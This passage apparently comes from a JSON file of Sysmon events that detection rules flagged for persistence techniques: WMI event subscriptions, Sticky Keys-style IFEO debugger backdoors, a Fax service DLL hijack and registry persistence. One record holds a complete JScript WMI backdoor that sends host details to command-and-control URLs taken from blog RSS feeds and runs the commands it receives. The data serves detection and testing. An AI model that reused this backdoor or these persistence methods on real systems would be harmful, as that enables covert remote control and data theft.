		"destination":" \"c:\\\\Windows\\\\System32\\\\cmd.exe\"",
		"operation":"Deleted",
		"type":"Command Line"
	},
	{
		"Rule level":"high",
		"title":"WMI Event Subscription - 76D7312E",
		"description":"Detects creation of WMI event subscription persistence method",
		"row_id":1825,
		"processid":1828,
		"user":"PC04\\IEUser",
		"utctime":"2019-04-03 18:11:54.178",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"PC04.example.corp",
		"eventid":20,
		"eventrecordid":7195,
		"threadid":3164,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":20,
		"systemtime":"2019-04-03T18:11:54.178467Z",
		"version":3,
		"eventtype":"WmiConsumerEvent",
		"destination":" \"var sXmlUrl=\\\"http://kumardeep.sosblogs.com/The-first-blog-b1/RSS-b1-rss2-posts.htm;http://blogs.rediff.com/anilchopra/feed/;http://www.blogster.com/kapoorsunil09/profile/rss\\\";var sOwner=\u0027XDD\u0027;var MAIN=function(){$=this;$.key=\u0027W\u0027;$.sFeedUrl=sXmlUrl;$.sOwner=sOwner;$.sXmlUrl=\u0027\u0027;$.oHttp=null;$.oShell=null;$.oStream=null;$.sHostName=null;$.sOSType=null;$.sMacAddress=null;$.sURLParam=null;$.version=\u00272.0.0\u0027;$.runtime=5000;$.oWMI=null;$._x=ActiveXObject;};MAIN.prototype={InitObjects:function(){$.oWMI=GetObject(\u0027winmgmts:{impersonationLevel=impersonate}!\\\\\\\\\\\\\\\\.\\\\\\\\root\\\\\\\\cimv2\u0027);$.oShell=new $._x(\u0027WScript.Shell\u0027);$.oStream=new $._x(\u0027ADODB.Stream\u0027);$.GetOSInfo();$.GetMacAddress();$.GenerateUrlParam();},WMI:function(sql){return $.oWMI.ExecQuery(sql);},GetOSInfo:function(){var e=new Enumerator($.WMI(\u0027Select * from Win32_OperatingSystem\u0027));if(!e.atEnd()){var item=e.item();$.sOSType=item.Caption+item.ServicePackMajorVersion;$.sHostName=item.CSName;}},GetMacAddress:function(){var e=new Enumerator($.WMI(\u0027Select * from Win32_NetworkAdapter where PNPDeviceID like \\\\\\\"%PCI%\\\\\\\" and NetConnectionStatus=2\u0027));if(!e.atEnd()){$.sMacAddress=e.item().MACAddress;}},GenerateUrlParam:function(){var time=new Date();$.sURLParam=\u0027cstype=server\u0026authname=servername\u0026authpass=serverpass\u0026hostname=\u0027+$.sHostName+\u0027\u0026ostype=\u0027+$.sOSType+\u0027\u0026macaddr=\u0027+$.sMacAddress+\u0027\u0026owner=\u0027+$.sOwner+\u0027\u0026version=\u0027+$.version+\u0027\u0026runtime=\u0027+$.runtime;$.sURLParam+=\u0027\u0026t=\u0027+time.getMinutes()+time.getSeconds();},CleanObjects:function(){$.oShell=null;$.oStream=null;var e=new Enumerator($.WMI(\u0027Select * from Win32_Process where Name=\\\\\\\"scrcons.exe\\\\\\\"\u0027));while(!e.atEnd()){e.item().terminate();e.moveNext();}},Decode:function(sourceStr){var keycode=sourceStr.charCodeAt(0);var source=sourceStr.substr(1);var vals=source.split(\u0027,\u0027);var result=\u0027\u0027;for(var i=0;i\u003cvals.length;i++){result+=String.fromCharCode(vals[i]^keycode);}return result;},circleDecode:function(sc){var base=sc.charCodeAt(0);var s=base-32;var r=\u0027\u0027;for(var i=1;i\u003csc.length;i++){var nc=sc.charCodeAt(i)-s-i+1;if(nc\u003c32){nc=126+(nc-32)%94;}r+=String.fromCharCode(nc);}return r;},MainLoop:function(){$.oHttp=new $._x(\u0027Microsoft.XmlHttp\u0027);var feedUrlArry=$.sFeedUrl.split(\u0027;\u0027);var start=new Date();var oXml=new ActiveXObject(\u0027MSXML2.DOMDocument.3.0\u0027);for(var n=0;n\u003cfeedUrlArry.length;n++){var UrlList=new Array();var URLnum=0;try{var tstr=feedUrlArry[n].match(\u0027http://.*?\\\\\\\\.php\u0027);if(tstr!=null){UrlList[URLnum++]=tstr;}else{$.oHttp.Open(\u0027GET\u0027,feedUrlArry[n],false);$.oHttp.setRequestHeader(\u0027User-Agent\u0027,\u0027Mozilla/5.0 (Windows; U; Windows NT 5.1; rv:1.9.1) Gecko/20090624 Firefox/3.5\u0027);$.oHttp.Send();var response=$.oHttp.ResponseText.replace(/(^\\\\s*)|(\\\\s*$)/g,\u0027\u0027);var re=/\u003ctitle\u003e@(.*)@\u003c\\\\/title\u003e+/g;var titleList=response.match(re);for(var i=0;i\u003ctitleList.length;i++){try{oXml.loadXML(titleList[i]);var container=oXml.getElementsByTagName(\u0027title\u0027);var tmpstr=container[0].text.match(\u0027@(.*)@\u0027);UrlList[URLnum++]=$.circleDecode(tmpstr[1]);}catch(e){}}}for(var Urlindex=0;Urlindex\u003cUrlList.length;Urlindex++){$.sXmlUrl=UrlList[Urlindex];var runnum=360;while(runnum--\u003e0){$.oHttp.Open(\u0027POST\u0027,$.sXmlUrl,false);$.oHttp.setRequestHeader(\u0027CONTENT-TYPE\u0027,\u0027application/x-www-form-urlencoded\u0027);$.oHttp.Send($.sURLParam);var response=$.oHttp.ResponseText.replace(/(^\\\\s*)|(\\\\s*$)/g,\u0027\u0027);if(response.length\u003e0){var commands=null;var container;try{oXml.loadXML(response);container=oXml.getElementsByTagName(\u0027div\u0027);for(var i=0;i\u003ccontainer.length;i++){if(container[i].getAttribute(\u0027id\u0027)==\u00270a552b5a4352\u0027){commands=eval(\u0027(\u0027+container[i].text+\u0027)\u0027).command;}}}catch(e){}if(commands!=null){var commandresult=\u0027\u0027;for(var i=0;i\u003ccommands.length;i++){var result=\u0027no response\u0027;try{result=eval($.Decode(commands[i].value));}catch(e){}if(i\u003e0){commandresult+=\u0027,\u0027;}commandresult+=\u0027\\\\\u0027\u0027+commands[i].id+\u0027\\\\\u0027:\\\\\u0027\u0027+escape(result)+\u0027\\\\\u0027\u0027;}if(commandresult.length\u003e0){commandresult=\u0027{\u0027+commandresult+\u0027}\u0027;$.oHttp.Open(\u0027POST\u0027,$.sXmlUrl,false);$.oHttp.setRequestHeader(\u0027CONTENT-TYPE\u0027,\u0027application/x-www-form-urlencoded\u0027);$.oHttp.Send($.sURLParam+\u0027\u0026command=result\u0026commandresult=\u0027+commandresult);}}else{$.sXmlUrl=\u0027\u0027;runnum=0;}}$.runtime=(new Date()).getTime()-start.getTime();WScript.Sleep(10000);}if($.sXmlUrl.length\u003e0){return;}}}catch(e){}}},Fire:function(){$.InitObjects();try{$.MainLoop();}catch(e){}$.CleanObjects();}};new MAIN().Fire();\"",
		"operation":"Modified",
		"type":"Script"
	},
	{
		"Rule level":"high",
		"title":"WMI Event Subscription - 76D7312E",
		"description":"Detects creation of WMI event subscription persistence method",
		"row_id":4330,
		"processid":2796,
		"user":"MSEDGEWIN10\\IEUser",
		"utctime":"2019-07-19 14:54:58.807",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":20,
		"eventrecordid":4056,
		"threadid":1776,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":20,
		"systemtime":"2019-07-19T14:54:58.819106Z",
		"version":3,
		"eventtype":"WmiConsumerEvent",
		"destination":" \"C:\\\\Windows\\\\System32\\\\notepad.exe\"",
		"operation":"Created",
		"type":"Command Line"
	},
	{
		"Rule level":"high",
		"title":"WMI Event Subscription - 76D7312E",
		"description":"Detects creation of WMI event subscription persistence method",
		"row_id":4333,
		"processid":2796,
		"user":"MSEDGEWIN10\\IEUser",
		"utctime":"2019-07-19 14:57:02.884",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":20,
		"eventrecordid":4059,
		"threadid":4356,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":20,
		"systemtime":"2019-07-19T14:57:02.895491Z",
		"version":3,
		"eventtype":"WmiConsumerEvent",
		"destination":" \"C:\\\\Windows\\\\System32\\\\notepad.exe\"",
		"operation":"Deleted",
		"type":"Command Line"
	},
	{
		"Rule level":"high",
		"title":"WMI Event Subscription - 76D7312E",
		"description":"Detects creation of WMI event subscription persistence method",
		"row_id":689,
		"processid":2032,
		"user":"IEWIN7\\IEUser",
		"utctime":"2019-05-11 17:58:23.418",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"IEWIN7",
		"eventid":21,
		"eventrecordid":16112,
		"threadid":4092,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":21,
		"systemtime":"2019-05-11T17:58:23.418784Z",
		"version":3,
		"eventtype":"WmiBindingEvent",
		"operation":"Created",
		"consumer":" \"CommandLineEventConsumer.Name=\\\"BotConsumer23\\\"\"",
		"filter":" \"__EventFilter.Name=\\\"BotFilter82\\\"\""
	},
	{
		"Rule level":"high",
		"title":"WMI Event Subscription - 76D7312E",
		"description":"Detects creation of WMI event subscription persistence method",
		"row_id":700,
		"processid":2032,
		"user":"IEWIN7\\IEUser",
		"utctime":"2019-05-11 17:58:55.090",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"IEWIN7",
		"eventid":21,
		"eventrecordid":16123,
		"threadid":4092,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":21,
		"systemtime":"2019-05-11T17:58:55.090659Z",
		"version":3,
		"eventtype":"WmiBindingEvent",
		"operation":"Deleted",
		"consumer":" \"CommandLineEventConsumer.Name=\\\"BotConsumer23\\\"\"",
		"filter":" \"__EventFilter.Name=\\\"BotFilter82\\\"\""
	},
	{
		"Rule level":"high",
		"title":"WMI Event Subscription - 76D7312E",
		"description":"Detects creation of WMI event subscription persistence method",
		"row_id":1826,
		"processid":1828,
		"user":"PC04\\IEUser",
		"utctime":"2019-04-03 18:11:54.198",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"PC04.example.corp",
		"eventid":21,
		"eventrecordid":7197,
		"threadid":3164,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":21,
		"systemtime":"2019-04-03T18:11:54.198496Z",
		"version":3,
		"eventtype":"WmiBindingEvent",
		"operation":"Modified",
		"consumer":" \"\\\\\\\\.\\\\root\\\\subscription:ActiveScriptEventConsumer.Name=\\\"ProbeScriptFint\\\"\"",
		"filter":" \"\\\\\\\\.\\\\root\\\\subscription:__EventFilter.Name=\\\"ProbeScriptFint\\\"\""
	},
	{
		"Rule level":"high",
		"title":"WMI Event Subscription - 76D7312E",
		"description":"Detects creation of WMI event subscription persistence method",
		"row_id":4331,
		"processid":2796,
		"user":"MSEDGEWIN10\\IEUser",
		"utctime":"2019-07-19 14:57:02.369",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":21,
		"eventrecordid":4057,
		"threadid":4356,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":21,
		"systemtime":"2019-07-19T14:57:02.378480Z",
		"version":3,
		"eventtype":"WmiBindingEvent",
		"operation":"Created",
		"consumer":" \"\\\\\\\\.\\\\ROOT\\\\subscription:CommandLineEventConsumer.Name=\\\"AtomicRedTeam-WMIPersistence-Example\\\"\"",
		"filter":" \"\\\\\\\\.\\\\ROOT\\\\subscription:__EventFilter.Name=\\\"AtomicRedTeam-WMIPersistence-Example\\\"\""
	},
	{
		"Rule level":"high",
		"title":"WMI Event Subscription - 76D7312E",
		"description":"Detects creation of WMI event subscription persistence method",
		"row_id":4332,
		"processid":2796,
		"user":"MSEDGEWIN10\\IEUser",
		"utctime":"2019-07-19 14:57:02.791",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":21,
		"eventrecordid":4058,
		"threadid":4356,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":21,
		"systemtime":"2019-07-19T14:57:02.806045Z",
		"version":3,
		"eventtype":"WmiBindingEvent",
		"operation":"Deleted",
		"consumer":" \"\\\\\\\\.\\\\ROOT\\\\subscription:CommandLineEventConsumer.Name=\\\"AtomicRedTeam-WMIPersistence-Example\\\"\"",
		"filter":" \"\\\\\\\\.\\\\ROOT\\\\subscription:__EventFilter.Name=\\\"AtomicRedTeam-WMIPersistence-Example\\\"\""
	},
	{
		"Rule level":"high",
		"title":"Fax Service DLL Search Order Hijack - A5AA6D22",
		"description":"The Fax service attempts to load ualapi.dll, which is non-existent. An attacker can then (side)load their own malicious DLL using this service.",
		"row_id":1931,
		"company":"?",
		"description":"?",
		"fileversion":"?",
		"hashes":"SHA1=9D1873AEFC3F59E649F3FB822C1FA3D52C39970E,MD5=9B97E05E67107AA18BBF3E4F5F121B2B,SHA256=9915C62360EFF866C09072AF754FA70A9BD4BF4A73CDB4048F415002F7256AD0,IMPHASH=DF1295012B8EB2127DC3667CF1881634",
		"image":"C:\\Windows\\System32\\FXSSVC.exe",
		"processguid":"747F3D96-E8A7-5F26-0000-0010230D1A00",
		"processid":3200,
		"product":"?",
		"utctime":"2020-08-02 16:24:07.483",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":7,
		"eventrecordid":339882,
		"threadid":3596,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":7,
		"systemtime":"2020-08-02T16:24:07.551366Z",
		"version":3,
		"imageloaded":"C:\\Windows\\System32\\Ualapi.dll",
		"signaturestatus":"Unavailable",
		"signed":"false",
		"originalfilename":"?"
	},
	{
		"Rule level":"critical",
		"title":"Sticky Key Like Backdoor Usage - F9BA9376",
		"description":"Detects the usage and installation of a backdoor that uses an option to register a malicious debugger for built-in tools that are accessible in the login screen",
		"row_id":4005,
		"image":"C:\\Windows\\system32\\reg.exe",
		"processguid":"747F3D96-D89A-5D31-0000-0010F56D3200",
		"processid":2796,
		"utctime":"2019-07-19 14:50:02.212",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":13,
		"eventrecordid":3731,
		"threadid":3592,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":13,
		"systemtime":"2019-07-19T14:50:02.220426Z",
		"version":2,
		"details":"C:\\windows\\system32\\cmd.exe",
		"eventtype":"SetValue",
		"targetobject":"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\osk.exe\\Debugger",
		"rulename":"Persistence - IFEO Debugger ValueSet"
	},
	{
		"Rule level":"critical",
		"title":"Sticky Key Like Backdoor Usage - F9BA9376",
		"description":"Detects the usage and installation of a backdoor that uses an option to register a malicious debugger for built-in tools that are accessible in the login screen",
		"row_id":4009,
		"image":"C:\\Windows\\system32\\reg.exe",
		"processguid":"747F3D96-D89F-5D31-0000-0010BD7F3200",
		"processid":2796,
		"utctime":"2019-07-19 14:50:07.307",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":13,
		"eventrecordid":3735,
		"threadid":3592,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":13,
		"systemtime":"2019-07-19T14:50:07.322063Z",
		"version":2,
		"details":"C:\\windows\\system32\\cmd.exe",
		"eventtype":"SetValue",
		"targetobject":"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\\Debugger",
		"rulename":"Persistence - IFEO Debugger ValueSet"
	},
	{
		"Rule level":"critical",
		"title":"Sticky Key Like Backdoor Usage - F9BA9376",
		"description":"Detects the usage and installation of a backdoor that uses an option to register a malicious debugger for built-in tools that are accessible in the login screen",
		"row_id":4013,
		"image":"C:\\Windows\\system32\\reg.exe",
		"processguid":"747F3D96-D8A2-5D31-0000-0010D5913200",
		"processid":2796,
		"utctime":"2019-07-19 14:50:10.275",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":13,
		"eventrecordid":3739,
		"threadid":3592,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":13,
		"systemtime":"2019-07-19T14:50:10.295724Z",
		"version":2,
		"details":"C:\\windows\\system32\\cmd.exe",
		"eventtype":"SetValue",
		"targetobject":"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe\\Debugger",
		"rulename":"Persistence - IFEO Debugger ValueSet"
	},
	{
		"Rule level":"critical",
		"title":"Sticky Key Like Backdoor Usage - F9BA9376",
		"description":"Detects the usage and installation of a backdoor that uses an option to register a malicious debugger for built-in tools that are accessible in the login screen",
		"row_id":4017,
		"image":"C:\\Windows\\system32\\reg.exe",
		"processguid":"747F3D96-D8A5-5D31-0000-0010C39D3200",
		"processid":2796,
		"utctime":"2019-07-19 14:50:13.137",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":13,
		"eventrecordid":3743,
		"threadid":3592,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":13,
		"systemtime":"2019-07-19T14:50:13.153167Z",
		"version":2,
		"details":"C:\\windows\\system32\\cmd.exe",
		"eventtype":"SetValue",
		"targetobject":"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\magnify.exe\\Debugger",
		"rulename":"Persistence - IFEO Debugger ValueSet"
	},
	{
		"Rule level":"critical",
		"title":"Sticky Key Like Backdoor Usage - F9BA9376",
		"description":"Detects the usage and installation of a backdoor that uses an option to register a malicious debugger for built-in tools that are accessible in the login screen",
		"row_id":4021,
		"image":"C:\\Windows\\system32\\reg.exe",
		"processguid":"747F3D96-D8A6-5D31-0000-0010A5A93200",
		"processid":2796,
		"utctime":"2019-07-19 14:50:14.697",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":13,
		"eventrecordid":3747,
		"threadid":3592,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":13,
		"systemtime":"2019-07-19T14:50:14.716040Z",
		"version":2,
		"details":"C:\\windows\\system32\\cmd.exe",
		"eventtype":"SetValue",
		"targetobject":"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\narrator.exe\\Debugger",
		"rulename":"Persistence - IFEO Debugger ValueSet"
	},
	{
		"Rule level":"critical",
		"title":"Sticky Key Like Backdoor Usage - F9BA9376",
		"description":"Detects the usage and installation of a backdoor that uses an option to register a malicious debugger for built-in tools that are accessible in the login screen",
		"row_id":4025,
		"image":"C:\\Windows\\system32\\reg.exe",
		"processguid":"747F3D96-D8A9-5D31-0000-0010C0C63200",
		"processid":2796,
		"utctime":"2019-07-19 14:50:17.979",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":13,
		"eventrecordid":3751,
		"threadid":3592,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":13,
		"systemtime":"2019-07-19T14:50:17.990891Z",
		"version":2,
		"details":"C:\\windows\\system32\\cmd.exe",
		"eventtype":"SetValue",
		"targetobject":"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\DisplaySwitch.exe\\Debugger",
		"rulename":"Persistence - IFEO Debugger ValueSet"
	},
	{
		"Rule level":"critical",
		"title":"Registry Persistence Mechanisms - BB467BB2",
		"description":"Detects persistence registry keys",
		"row_id":430,
		"image":"C:\\Windows\\system32\\reg.exe",
		"processguid":"365ABB72-6F5D-5D0A-0000-00109B331300",
		"processid":284,
		"utctime":"2019-06-19 17:22:41.709",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"IEWIN7",
		"eventid":13,
		"eventrecordid":8034,
		"threadid":2076,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":13,
		"systemtime":"2019-06-19T17:22:41.709638Z",
		"version":2,
		"details":"DWORD (0x00000200)",
		"eventtype":"SetValue",
		"targetobject":"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe\\GlobalFlag"
	},
	{
		"Rule level":"critical",
		"title":"Registry Persistence Mechanisms - BB467BB2",
		"description":"Detects persistence registry keys",
		"row_id":432,
		"image":"C:\\Windows\\system32\\reg.exe",
		"processguid":"365ABB72-6F61-5D0A-0000-0010DB351300",
		"processid":284,
		"utctime":"2019-06-19 17:22:43.912",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"IEWIN7",
		"eventid":13,
		"eventrecordid":8036,
		"threadid":2076,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":13,
		"systemtime":"2019-06-19T17:22:43.944013Z",
		"version":2,
		"details":"DWORD (0x00000001)",
		"eventtype":"SetValue",
		"targetobject":"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe\\ReportingMode",
		"rulename":"Persistence via SilentProcessExit hijack"
	},
